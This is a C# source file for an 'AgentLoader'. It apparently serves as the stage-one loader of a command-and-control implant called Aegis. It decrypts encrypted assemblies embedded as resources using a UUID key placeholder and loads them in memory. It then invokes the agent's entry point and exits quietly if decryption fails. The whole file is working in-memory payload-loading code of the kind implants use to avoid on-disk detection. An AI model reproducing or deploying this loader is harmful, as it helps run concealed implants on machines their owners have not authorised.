using Aegis.Models.Interfaces;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;

namespace Aegis.Loader
{
    public class AgentLoader : ILoader
    {
        public async Task Go()
        {
            string key = "%UUID%";
            List<string> excludedDlls = new List<string>() { "Aegis.Loader.Agent.bin", "Aegis.Loader.Agent.Models.bin" };
            var alc = AssemblyLoadContext.Default;
            var asmExe = Assembly.GetExecutingAssembly();
            Console.WriteLine("Getting Executing Assembly.");
            if (asmExe == null)
            {
                return;
            }

            List<string> sources = asmExe.GetManifestResourceNames().ToList();
            Stream modelStream = new MemoryStream();
            if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains("Agent.Models.bin"))), modelStream, key))
            {
                return;
            }
            modelStream.Position = 0;
            alc.LoadFromStream(modelStream);
            //Load the rest of the DLLs except for the agent
            foreach (string aa in sources)
            {
                Console.WriteLine(aa);
                if (excludedDlls.Contains(aa))
                {
                    continue;
                }

                Stream s = new MemoryStream();
                if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains(aa))), s, key))
                {
                    Environment.Exit(0);
                }

                if (s != null)
                {
                    s.Position = 0;
                    alc.LoadFromStream(s);
                }
            }
            Stream ad = new MemoryStream();
            if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains("Agent.bin"))), ad, key))
            {
                Environment.Exit(0);
            }
            // Get the entry point method
            Assembly agent;
            if (ad == null)
            {
                return;
            }
            ad.Position = 0;
            agent = alc.LoadFromStream(ad);
            MethodInfo entryPoint = agent.EntryPoint;

            // Invoke the entry point method
            object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
            Console.WriteLine("Executing Agent.");
            entryPoint.Invoke(null, parameters);
        }
    }
}
